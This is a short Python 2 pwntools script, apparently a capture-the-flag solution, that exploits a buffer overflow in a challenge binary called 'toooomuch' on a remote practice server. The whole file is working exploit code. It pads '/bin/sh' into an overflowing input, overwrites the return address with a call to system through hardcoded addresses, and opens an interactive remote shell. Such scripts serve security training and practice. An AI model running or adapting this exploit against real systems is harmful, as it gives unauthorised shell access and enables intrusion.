#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

def padd(s, len, align='<'):
	return ('{:' + align + str(len) + '}').format(s).replace(' ', 'A')

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "hackme.inndy.tw"
port = "7702"

if _local:
	r = process('./toooomuch')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

system_got_plt = 0x080484c0
data = 0x8049c60

payload = padd('/bin/sh\x00', 28)
payload += p32(system_got_plt) + 'AAAA' + p32(data)

print r. recvuntil(':')
r.sendline(payload)
# print r.recv()
r.interactive()